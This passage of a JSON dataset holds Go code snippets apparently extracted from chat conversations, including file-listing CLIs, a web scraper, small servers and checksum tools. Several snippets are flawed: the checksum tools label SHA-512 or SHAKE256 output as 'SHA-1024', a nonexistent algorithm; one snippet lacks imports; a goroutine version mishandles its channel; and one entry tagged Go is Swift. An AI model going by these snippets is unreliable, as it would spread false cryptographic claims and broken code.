    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n)\n\nfunc isPrime(num int) bool {\n\tif num < 2 {\n\t\treturn false\n\t}\n\tmaxDivisor := int(math.Sqrt(float64(num)))\n\tfor i := 2; i <= maxDivisor; i++ {\n\t\tif num%i == 0 {\n\t\t\treturn false\n\t\t}\n\t}\n\treturn true\n}\n\nfunc extractPrimes(numbers []int) []int {\n\tvar primes []int\n\tfor _, num := range numbers {\n\t\tif isPrime(num) {\n\t\t\tprimes = append(primes, num)\n\t\t}\n\t}\n\treturn primes\n}\n\nfunc main() {\n\tnumbers := []int{2, 3, 7, 10, 15, 23, 31, 45, 56}\n\tprimes := extractPrimes(numbers)\n\tfmt.Println(\"Prime numbers:\", primes)\n}",
    "filename": "6aedde2612b44a378d396ddd463e117a_0.go"
  },
  {
    "conversation_hash": "689266f83a5aff289987bcc3c944655d",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"google.golang.org/grpc\"\n\t\"log\"\n\t\"net\"\n)\n\nfunc main() {\n\t// Create a new gRPC server\n\tgrpcServer := grpc.NewServer()\n\n\t// Your gRPC service implementation\n\t// ...\n\n\t// Define the address to listen on (localhost)\n\taddr := \"localhost:50051\"\n\n\t// Create a TCP listener on the address\n\tlistener, err := net.Listen(\"tcp\", addr)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to listen: %v\", err)\n\t}\n\n\t// Start serving the gRPC server on the listener\n\terr = grpcServer.Serve(listener)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to serve: %v\", err)\n\t}\n}",
    "filename": "689266f83a5aff289987bcc3c944655d_2.go"
  },
  {
    "conversation_hash": "889e05645b507ee2f44eb1f84654e3d8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/csv\"\n\t\"flag\"\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nfunc main() {\n\tvar drive string\n\tflag.StringVar(&drive, \"drive\", \"\", \"Flag for specifying drive letter (e.g. -drive c)\")\n\tflag.Parse()\n\n\tif drive == \"\" {\n\t\tfmt.Println(\"Nie podano flagi drive.\")\n\t\tflag.PrintDefaults()\n\t\treturn\n\t}\n\n\troot := drive + \":/\"\n\n\tfileName := \"mp3_files_\" + strings.ToLower(drive) + \".csv\"\n\tfile, err := os.Create(fileName)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas tworzenia pliku CSV:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\twriter := csv.NewWriter(file)\n\tdefer writer.Flush()\n\n\t// Ustawienie kodowania na UTF-8\n\twriter.Write([]string{string('\\uFEFF')})\n\n\theaders := []string{\"Numer\", \"Nazwa pliku\", \"Sciezka dostepu\", \"Rozszerzenie\", \"Rozmiar\", \"Data utworzenia\"}\n\twriter.Write(headers)\n\n\tlineNumber := 1\n\n\terr = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\text := strings.ToLower(filepath.Ext(path))\n\t\tif ext == \".mp3\" {\n\t\t\tsize := info.Size()\n\t\t\tcreated := info.ModTime().Format(\"2006-01-02 15:04:05\")\n\n\t\t\tdata := []string{\n\t\t\t\tfmt.Sprintf(\"%d\", lineNumber),\n\t\t\t\tpath,\n\t\t\t\tfilepath.Base(path),\n\t\t\t\text,\n\t\t\t\tfmt.Sprintf(\"%d\", size),\n\t\t\t\tcreated,\n\t\t\t}\n\t\t\twriter.Write(data)\n\n\t\t\tlineNumber++\n\t\t}\n\n\t\treturn nil\n\t})\n\n\tfmt.Printf(\"Przeszukiwanie ukończone. Zapisano informacje o plikach MP3 do pliku CSV: %s\\n\", fileName)\n}",
    "filename": "889e05645b507ee2f44eb1f84654e3d8_0.go"
  },
  {
    "conversation_hash": "244ec7458afd97896ab3b2096c12bd71",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Hello, World!\")\n\t})\n\n\thttp.ListenAndServe(\":8080\", nil)\n}",
    "filename": "244ec7458afd97896ab3b2096c12bd71_0.go"
  },
  {
    "conversation_hash": "244ec7458afd97896ab3b2096c12bd71",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype SDP struct {\n\tSDP  string `json:\"sdp\"`\n\tType string `json:\"type\"`\n}\n\nfunc handleOffer(w http.ResponseWriter, r *http.Request) {\n\tvar offer SDP\n\terr := json.NewDecoder(r.Body).Decode(&offer)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\treturn\n\t}\n\n\t// 使用海康摄像头的API获取SDP应答\n\tsdpAnswer := getSDPAnswer(offer.SDP) // 这里需要根据海康摄像头的API进行实现\n\n\t// 将SDP应答发送回客户端\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tw.WriteHeader(http.StatusOK)\n\tjson.NewEncoder(w).Encode(sdpAnswer)\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/offer\", handleOffer)\n\thttp.Handle(\"/\", http.FileServer(http.Dir(\"public\")))\n\thttp.ListenAndServe(\":8080\", nil)\n}",
    "filename": "244ec7458afd97896ab3b2096c12bd71_2.go"
  },
  {
    "conversation_hash": "f2eb3b4198f108080315813490cee54b",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/csv\"\n\t\"encoding/json\"\n\t\"encoding/xml\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n\n\t\"github.com/PuerkitoBio/goquery\"\n)\n\ntype Link struct {\n\tURL  string `json:\"url\" xml:\"url\"`\n\tText string `json:\"text\" xml:\"text\"`\n}\n\nfunc main() {\n\turl := \"https://example.com\" // Podaj adres URL strony, którą chcesz przeszukać\n\n\tlinks := scrapePage(url)\n\n\tsaveToCSV(links)\n\tsaveToJSON(links)\n\tsaveToXML(links)\n}\n\nfunc scrapePage(url string) []Link {\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer resp.Body.Close()\n\n\tdoc, err := goquery.NewDocumentFromReader(resp.Body)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tvar links []Link\n\n\tdoc.Find(\"a\").Each(func(i int, s *goquery.Selection) {\n\t\thref, _ := s.Attr(\"href\")\n\t\ttext := s.Text()\n\n\t\tlink := Link{\n\t\t\tURL:  href,\n\t\t\tText: text,\n\t\t}\n\n\t\tlinks = append(links, link)\n\t})\n\n\treturn links\n}\n\nfunc saveToCSV(links []Link) {\n\tfile, err := os.Create(\"links.csv\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\twriter := csv.NewWriter(file)\n\tdefer writer.Flush()\n\n\tfor _, link := range links {\n\t\terr := writer.Write([]string{link.URL, link.Text})\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t}\n}\n\nfunc saveToJSON(links []Link) {\n\tfile, err := os.Create(\"links.json\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\tencoder := json.NewEncoder(file)\n\tencoder.SetIndent(\"\", \"  \")\n\n\terr = encoder.Encode(links)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n\nfunc saveToXML(links []Link) {\n\tfile, err := os.Create(\"links.xml\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\txmlData := []string{\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\", \"<links>\\n\"}\n\n\tfor _, link := range links {\n\t\txmlData = append(xmlData, fmt.Sprintf(\"<link>\\n<url>%s</url>\\n<text>%s</text>\\n</link>\\n\", link.URL, link.Text))\n\t}\n\n\txmlData = append(xmlData, \"</links>\")\n\n\t_, err = file.WriteString(strings.Join(xmlData, \"\"))\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "f2eb3b4198f108080315813490cee54b_0.go"
  },
  {
    "conversation_hash": "dc55b008198eda5553a001bafc4cf69e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "fileFlag := flag.String(\"f\", \"\", \"Ścieżka do pliku\")\ntextFlag := flag.String(\"z\", \"\", \"Tekst\")\nchecksumFlag := flag.String(\"c\", \"\", \"Suma kontrolna\")\n\nflag.Parse()\n\nif *fileFlag == \"\" && *textFlag == \"\" && *checksumFlag == \"\" {\n    flag.Usage()\n    os.Exit(1)\n}\n\nif *fileFlag != \"\" {\n    hash, err := getFileChecksum(*fileFlag)\n    if err != nil {\n        log.Fatalf(\"Błąd generowania skrótu dla pliku: %v\", err)\n    }\n    fmt.Printf(\"Skrót SHA-1024 dla pliku %s: %s\\n\", *fileFlag, hash)\n    // Zapisz skrót do pliku z rozszerzeniem .sh1k\n    fileExt := filepath.Ext(*fileFlag)\n    outputFile := strings.TrimSuffix(*fileFlag, fileExt) + \".sh1k\"\n    err = ioutil.WriteFile(outputFile, []byte(hash), 0644)\n    if err != nil {\n        log.Fatalf(\"Błąd zapisu skrótu do pliku: %v\", err)\n    }\n    fmt.Printf(\"Skrót został zapisany do pliku %s\\n\", outputFile)\n}\n\nif *textFlag != \"\" {\n    hash := getTextChecksum(*textFlag)\n    fmt.Printf(\"Skrót SHA-1024 dla tekstu \\\"%s\\\": %s\\n\", *textFlag, hash)\n}\n\nif *checksumFlag != \"\" {\n    match := verifyChecksum(*checksumFlag, *fileFlag, *textFlag)\n    if match {\n        fmt.Println(\"Suma kontrolna jest poprawna.\")\n    } else {\n        fmt.Println(\"Suma kontrolna jest niepoprawna.\")\n    }\n}\n\nfunc getFileChecksum(filePath string) (string, error) {\n    file, err := os.Open(filePath)\n    if err != nil {\n        return \"\", err\n    }\n    defer file.Close()\n\n    hash := sha512.New()\n    if _, err := io.Copy(hash, file); err != nil {\n        return \"\", err\n    }\n\n    checksum := hex.EncodeToString(hash.Sum(nil))\n    return checksum, nil\n}\n\nfunc getTextChecksum(text string) string {\n    hash := sha512.Sum512([]byte(text))\n    checksum := hex.EncodeToString(hash[:])\n    return checksum\n}\n\nfunc verifyChecksum(checksum, filePath, text string) bool {\n    var data []byte\n\n    if filePath != \"\" {\n        file, err := os.Open(filePath)\n        if err != nil {\n            log.Fatalf(\"Błąd odczytu pliku: %v\", err)\n        }\n        defer file.Close()\n\n        d, err := ioutil.ReadAll(file)\n        if err != nil {\n            log.Fatalf(\"Błąd odczytu pliku: %v\", err)\n        }\n\n        data = d\n    }\n\n    if text != \"\" {\n        data = []byte(text)\n    }\n\n    hash := sha512.Sum512(data)\n    calculatedChecksum := hex.EncodeToString(hash[:])\n    return strings.EqualFold(checksum, calculatedChecksum)\n}",
    "filename": "dc55b008198eda5553a001bafc4cf69e_0.go"
  },
  {
    "conversation_hash": "a07e971f93c71bc94e762170d8b9878c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/sha512\"\n\t\"encoding/hex\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nfunc main() {\n\tfileFlag := flag.String(\"f\", \"\", \"Ścieżka do pliku\")\n\ttextFlag := flag.String(\"z\", \"\", \"Tekst\")\n\tchecksumFlag := flag.String(\"c\", \"\", \"Suma kontrolna\")\n\n\tflag.Parse()\n\n\tif *fileFlag == \"\" && *textFlag == \"\" && *checksumFlag == \"\" {\n\t\tflag.Usage()\n\t\tos.Exit(1)\n\t}\n\n\tif *fileFlag != \"\" {\n\t\thash, err := getFileChecksum(*fileFlag)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd generowania skrótu dla pliku: %v\", err)\n\t\t}\n\t\tfmt.Printf(\"Skrót SHA-1024 dla pliku %s: %s\\n\", *fileFlag, hash)\n\n\t\tif *checksumFlag != \"\" && verifyChecksum(*checksumFlag, *fileFlag, \"\") {\n\t\t\tfmt.Println(\"Suma kontrolna jest poprawna.\")\n\t\t} else {\n\t\t\tfmt.Println(\"Suma kontrolna jest niepoprawna.\")\n\t\t}\n\n\t\t// Zapisz skrót do pliku z rozszerzeniem .sh1k\n\t\tfileExt := filepath.Ext(*fileFlag)\n\t\toutputFile := strings.TrimSuffix(*fileFlag, fileExt) + \".sh1k\"\n\t\tif *checksumFlag == \"\" {\n\t\t\terr = ioutil.WriteFile(outputFile, []byte(hash), 0644)\n\t\t} else {\n\t\t\terr = saveHashToFile(outputFile, *checksumFlag)\n\t\t}\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd zapisu skrótu do pliku: %v\", err)\n\t\t}\n\t\tfmt.Printf(\"Skrót został zapisany do pliku %s\\n\", outputFile)\n\t}\n\n\tif *textFlag != \"\" {\n\t\thash := getTextChecksum(*textFlag)\n\t\tfmt.Printf(\"Skrót SHA-1024 dla tekstu \\\"%s\\\": %s\\n\", *textFlag, hash)\n\n\t\tif *checksumFlag != \"\" && verifyChecksum(*checksumFlag, \"\", *textFlag) {\n\t\t\tfmt.Println(\"Suma kontrolna jest poprawna.\")\n\t\t} else {\n\t\t\tfmt.Println(\"Suma kontrolna jest niepoprawna.\")\n\t\t}\n\t}\n}\n\nfunc getFileChecksum(filePath string) (string, error) {\n\tfile, err := os.Open(filePath)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tdefer file.Close()\n\n\thash := sha512.New()\n\tif _, err := io.Copy(hash, file); err != nil {\n\t\treturn \"\", err\n\t}\n\n\tchecksum := hex.EncodeToString(hash.Sum(nil))\n\treturn checksum, nil\n}\n\nfunc getTextChecksum(text string) string {\n\thash := sha512.Sum512([]byte(text))\n\tchecksum := hex.EncodeToString(hash[:])\n\treturn checksum\n}\n\nfunc saveHashToFile(fileName, hash string) error {\n\tfile, err := os.Create(fileName)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer file.Close()\n\n\t_, err = io.WriteString(file, hash)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc verifyChecksum(checksum, filePath, text string) bool {\n\tvar data []byte\n\n\tif filePath != \"\" {\n\t\tfile, err := os.Open(filePath)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd odczytu pliku: %v\", err)\n\t\t}\n\t\tdefer file.Close()\n\n\t\td, err := ioutil.ReadAll(file)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd odczytu pliku: %v\", err)\n\t\t}\n\n\t\tdata = d\n\t}\n\n\tif text != \"\" {\n\t\tdata = []byte(text)\n\t}\n\n\thash := sha512.Sum512(data)\n\tcalculatedChecksum := hex.EncodeToString(hash[:])\n\treturn strings.EqualFold(checksum, calculatedChecksum)\n}",
    "filename": "a07e971f93c71bc94e762170d8b9878c_0.go"
  },
  {
    "conversation_hash": "5a1a00ed557fe76e595451a87228e8db",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/crypto/sha3\"\n\t\"encoding/hex\"\n)\n\nfunc main() {\n\tmessage := \"Hello, world!\" // Wiadomość, dla której chcemy wygenerować skrót\n\n\thash := sha3.NewShake256() // Inicjalizujemy nowy obiekt SHA-3 Shake256\n\n\thash.Write([]byte(message)) // Dodajemy wiadomość do obiektu hashującego\n\n\tdigest := make([]byte, 128) // Inicjalizujemy bufor na 128 bajtów (1024 bitów)\n\n\thash.Read(digest) // Odczytujemy skrót\n\n\thashString := hex.EncodeToString(digest) // Konwertujemy skrót na postać szesnastkową\n\n\tfmt.Println(\"SHA-1024 (SHA-3 Shake256) hash:\", hashString)\n}",
    "filename": "5a1a00ed557fe76e595451a87228e8db_0.go"
  },
  {
    "conversation_hash": "721732eb0c34db972d70ad61dd22e57d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    // ...\n\n    err = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {\n        if err != nil {\n            return err\n        }\n\n        // Sprawdź, czy to jest katalog\n        if info.IsDir() {\n            // Jeśli tak, wywołaj funkcję filepath.Walk rekurencyjnie dla tego katalogu\n            return filepath.Walk(path, func(subPath string, subInfo os.FileInfo, err error) error {\n                if err != nil {\n                    return err\n                }\n\n                if !subInfo.IsDir() {\n                    // Zapisz informacje o pliku do pliku CSV\n                    ext := strings.ToLower(filepath.Ext(subPath))\n                    size := subInfo.Size()\n                    created := subInfo.ModTime().Format(\"2006-01-02 15:04:05\")\n                    modified := subInfo.ModTime().Format(\"2006-01-02 15:04:05\")\n\n                    data := []string{\n                        fmt.Sprintf(\"%d\", lineNumber),\n                        subPath,\n                        filepath.Base(subPath),\n                        ext,\n                        fmt.Sprintf(\"%.2f MB\", float64(size)/ (1024 * 1024)),\n                        created,\n                        modified,\n                    }\n                    writer.Write(data)\n                    lineNumber++\n                }\n\n                return nil\n            })\n        }\n\n        // Zapisz informacje o pliku do pliku CSV\n        ext := strings.ToLower(filepath.Ext(path))\n        size := info.Size()\n        created := info.ModTime().Format(\"2006-01-02 15:04:05\")\n        modified := info.ModTime().Format(\"2006-01-02 15:04:05\")\n\n        data := []string{\n            fmt.Sprintf(\"%d\", lineNumber),\n            path,\n            filepath.Base(path),\n            ext,\n            fmt.Sprintf(\"%.2f MB\", float64(size)/(1024*1024)),\n            created,\n            modified,\n        }\n        writer.Write(data)\n        lineNumber++\n\n        return nil\n    })\n    \n    // ...\n\n}",
    "filename": "721732eb0c34db972d70ad61dd22e57d_0.go"
  },
  {
    "conversation_hash": "721732eb0c34db972d70ad61dd22e57d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    // ...\n\n    // Kanał do przekazywania wyników przetwarzania\n    results := make(chan []string)\n\n    err = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {\n        if err != nil {\n            return err\n        }\n\n        // Sprawdź, czy to jest katalog\n        if info.IsDir() {\n            // Jeśli tak, wywołaj funkcję filepath.Walk rekurencyjnie dla tego katalogu w gorutynie\n            go func(dirPath string) {\n                filepath.Walk(dirPath, func(subPath string, subInfo os.FileInfo, err error) error {\n                    if err != nil {\n                        return err\n                    }\n\n                    if !subInfo.IsDir() {\n                        // Przetwarzaj informacje o pliku i przekaż wynik do kanału\n                        ext := strings.ToLower(filepath.Ext(subPath))\n                        size := subInfo.Size()\n                        created := subInfo.ModTime().Format(\"2006-01-02 15:04:05\")\n                        modified := subInfo.ModTime().Format(\"2006-01-02 15:04:05\")\n\n                        data := []string{\n                            fmt.Sprintf(\"%d\", lineNumber),\n                            subPath,\n                            filepath.Base(subPath),\n                            ext,\n                            fmt.Sprintf(\"%.2f MB\", float64(size)/(1024*1024)),\n                            created,\n                            modified,\n                        }\n                        results <- data\n                    }\n\n                    return nil\n                })\n            }(path)\n        }\n\n        // Przetwarzaj informacje o pliku i przekaż wynik do kanału\n        ext := strings.ToLower(filepath.Ext(path))\n        size := info.Size()\n        created := info.ModTime().Format(\"2006-01-02 15:04:05\")\n        modified := info.ModTime().Format(\"2006-01-02 15:04:05\")\n\n        data := []string{\n            fmt.Sprintf(\"%d\", lineNumber),\n            path,\n            filepath.Base(path),\n            ext,\n            fmt.Sprintf(\"%.2f MB\", float64(size)/(1024*1024)),\n            created,\n            modified,\n        }\n        results <- data\n\n        return nil\n    })\n\n    // Funkcja do zapisu wyników przetwarzania z kanału do pliku CSV\n    go func() {\n        for result := range results {\n            writer.Write(result)\n            lineNumber++\n        }\n        close(results)\n    }()\n    \n    // ...\n\n}",
    "filename": "721732eb0c34db972d70ad61dd22e57d_1.go"
  },
  {
    "conversation_hash": "721732eb0c34db972d70ad61dd22e57d",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    var date string\n    flag.StringVar(&date, \"date\", \"\", \"Flaga do określania daty utworzenia (np. -date 2022-01-01)\")\n\n    // ...\n\n    err = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {\n        if err != nil {\n            return err\n        }\n\n        // Sprawdź, czy to jest katalog\n        if info.IsDir() {\n            // ...\n        }\n\n        // Sprawdź, czy daty utworzenia pliku spełniają warunek\n        created := info.ModTime().Format(\"2006-01-02 15:04:05\")\n        if date != \"\" && created < date {\n            return nil\n        }\n\n        // ...\n\n        return nil\n    })\n    \n    // ...\n}",
    "filename": "721732eb0c34db972d70ad61dd22e57d_2.go"
  },
  {
    "conversation_hash": "957e61757e62e8b45ad5ee2fc6943bf2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/csv\"\n\t\"flag\"\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n\t\"time\"\n)\n\nfunc main() {\n\tvar drive string\n\tflag.StringVar(&drive, \"drive\", \"\", \"Flaga do określania litery dysku (np. -drive c)\")\n\tshowHelp := flag.Bool(\"help\", false, \"Wyświetl pomoc\")\n\trecursive := flag.Bool(\"r\", false, \"Flaga do rekursywnego wyszukiwania\")\n\tuseGoroutines := flag.Bool(\"g\", false, \"Flaga do użycia gorutyn\")\n\tdate := flag.String(\"d\", \"\", \"Flaga do wyszukiwania po dacie\")\n\n\tflag.Parse()\n\n\tif *showHelp {\n\t\tfmt.Println(\"Strona : https://github.com/lukaszwojcikdev/files.git\")\n\t\treturn\n\t}\n\n\tif drive == \"\" {\n\t\tfmt.Println(\"Nie podano flagi drive.\")\n\t\tflag.PrintDefaults()\n\t\treturn\n\t}\n\n\troot := drive + \":/\"\n\n\tfileName := \"files_\" + strings.ToLower(drive) + \".csv\"\n\tfile, err := os.Create(fileName)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas tworzenia pliku CSV:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\twriter := csv.NewWriter(file)\n\tdefer writer.Flush()\n\n\t// Ustawienie kodowania na UTF-8\n\twriter.Write([]string{string('\\uFEFF')})\n\n\theaders := []string{\"Numer\", \"Nazwa_pliku\", \"Ścieżka_dostępu\", \"Rozszerzenie\", \"Rozmiar\", \"Data_utworzenia\", \"Data_modyfikacji\"}\n\twriter.Write(headers)\n\n\tlineNumber := 1\n\n\terr = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\text := strings.ToLower(filepath.Ext(path))\n\t\tsize := info.Size()\n\t\tcreated := info.ModTime().Format(\"2006-01-02 15:04:05\")\n\t\tmodified := info.ModTime().Format(\"2006-01-02 15:04:05\")\n\n\t\tif !*recursive && info.IsDir() {\n\t\t\treturn filepath.SkipDir\n\t\t}\n\n\t\tif *date != \"\" {\n\t\t\td, err := time.Parse(\"2006-01-02\", *date)\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\tif info.ModTime().Before(d) {\n\t\t\t\treturn nil\n\t\t\t}\n\t\t}\n\n\t\tdata := []string{\n\t\t\tfmt.Sprintf(\"%d\", lineNumber),\n\t\t\tpath,\n\t\t\tfilepath.Base(path),\n\t\t\text,\n\t\t\tfmt.Sprintf(\"%.2f MB\", float64(size)/(1024*1024)),\n\t\t\tcreated,\n\t\t\tmodified,\n\t\t}\n\t\twriter.Write(data)\n\t\tlineNumber++\n\n\t\treturn nil\n\t})\n\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas przeszukiwania:\", err)\n\t\treturn\n\t}\n\n\tfmt.Printf(\"Przeszukiwanie ukończone. Zapisano informacje o plikach do pliku CSV: %s\\n\", fileName)\n\tfmt.Println(\"Licencja: MIT\")\n}",
    "filename": "957e61757e62e8b45ad5ee2fc6943bf2_0.go"
  },
  {
    "conversation_hash": "0b62698018115bad27f57ef46329c511",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/hex\"\n\t\"fmt\"\n\t\"log\"\n\t\"strings\"\n\n\t\"golang.org/x/crypto/sha3\"\n)\n\nfunc verifyHash(filePath, expectedHash string) error {\n\tfile, err := os.Open(filePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer file.Close()\n\n\thash := sha3.NewShake256()\n\tif _, err := io.Copy(hash, file); err != nil {\n\t\treturn err\n\t}\n\n\tchecksum := make([]byte, 128)\n\thash.Read(checksum)\n\n\tcalculatedHash := hex.EncodeToString(checksum)\n\tif strings.ToLower(calculatedHash) != strings.ToLower(expectedHash) {\n\t\treturn fmt.Errorf(\"Niepoprawna suma kontrolna\")\n\t}\n\n\tfmt.Println(\"Suma kontrolna jest poprawna\")\n\treturn nil\n}\n\nfunc main() {\n\texpectedHash := \"Wprowadź tu oczekiwaną sumę kontrolną SHA-1024\"\n\tfilePath := \"Wprowadź tu ścieżkę do pliku\"\n\n\terr := verifyHash(filePath, expectedHash)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "0b62698018115bad27f57ef46329c511_0.go"
  },
  {
    "conversation_hash": "fe1e1b72bc368f8d5de18fd03b93e3b5",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "override func viewDidLoad() {\n    super.viewDidLoad()\n    SKPaymentQueue.default().add(self)\n    fetchProducts()\n}",
    "filename": "fe1e1b72bc368f8d5de18fd03b93e3b5_5.go"
  },
  {
    "conversation_hash": "c4f14ab545c90ede492ab8e6f9b5f871",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/md5\"\n\t\"crypto/sha1\"\n\t\"crypto/sha256\"\n\t\"encoding/hex\"\n\t\"flag\"\n\t\"fmt\"\n)\n\ntype HashStorage struct {\n\tmd5Hashes      map[string]string\n\tsha1Hashes     map[string]string\n\tsha256Hashes   map[string]string\n}\n\nfunc NewHashStorage() *HashStorage {\n\treturn &HashStorage{\n\t\tmd5Hashes:    make(map[string]string),\n\t\tsha1Hashes:   make(map[string]string),\n\t\tsha256Hashes: make(map[string]string),\n\t}\n}\n\nfunc (hs *HashStorage) Add(hashType string, key string, value string) {\n\tswitch hashType {\n\tcase \"md5\":\n\t\ths.md5Hashes[key] = value\n\tcase \"sha1\":\n\t\ths.sha1Hashes[key] = value\n\tcase \"sha256\":\n\t\ths.sha256Hashes[key] = value\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t}\n}\n\nfunc (hs *HashStorage) Remove(hashType string, key string) {\n\tswitch hashType {\n\tcase \"md5\":\n\t\tdelete(hs.md5Hashes, key)\n\tcase \"sha1\":\n\t\tdelete(hs.sha1Hashes, key)\n\tcase \"sha256\":\n\t\tdelete(hs.sha256Hashes, key)\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t}\n}\n\nfunc (hs *HashStorage) Modify(hashType string, key string, value string) {\n\tswitch hashType {\n\tcase \"md5\":\n\t\ths.md5Hashes[key] = value\n\tcase \"sha1\":\n\t\ths.sha1Hashes[key] = value\n\tcase \"sha256\":\n\t\ths.sha256Hashes[key] = value\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t}\n}\n\nfunc (hs *HashStorage) Get(hashType string, key string) string {\n\tswitch hashType {\n\tcase \"md5\":\n\t\treturn hs.md5Hashes[key]\n\tcase \"sha1\":\n\t\treturn hs.sha1Hashes[key]\n\tcase \"sha256\":\n\t\treturn hs.sha256Hashes[key]\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t\treturn \"\"\n\t}\n}\n\nfunc main() {\n\thashType := flag.String(\"type\", \"\", \"Type of hash (md5, sha1, sha256)\")\n\tkey := flag.String(\"key\", \"\", \"Key\")\n\tvalue := flag.String(\"value\", \"\", \"Value\")\n\taction := flag.String(\"action\", \"\", \"Action to perform (add, remove, modify, get)\")\n\n\tflag.Parse()\n\n\ths := NewHashStorage()\n\n\tswitch *action {\n\tcase \"add\":\n\t\ths.Add(*hashType, *key, *value)\n\t\tfmt.Println(\"Added \", *value, \" to \", *key, \" for hash type \", *hashType)\n\tcase \"remove\":\n\t\ths.Remove(*hashType, *key)\n\t\tfmt.Println(\"Removed \", *key, \" for hash type \", *hashType)\n\tcase \"modify\":\n\t\ths.Modify(*hashType, *key, *value)\n\t\tfmt.Println(\"Modified \", *key, \" to \", *value, \" for hash type \", *hashType)\n\tcase \"get\":\n\t\tresult := hs.Get(*hashType, *key)\n\t\tfmt.Println(\"Value for \", *key, \" in hash type \", *hashType, \" is \", result)\n\tdefault:\n\t\tfmt.Println(\"Invalid action. Please provide a valid action (add, remove, modify, get)\")\n\t}\n}",
    "filename": "c4f14ab545c90ede492ab8e6f9b5f871_0.go"
  },
  {
    "conversation_hash": "c4f14ab545c90ede492ab8e6f9b5f871",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
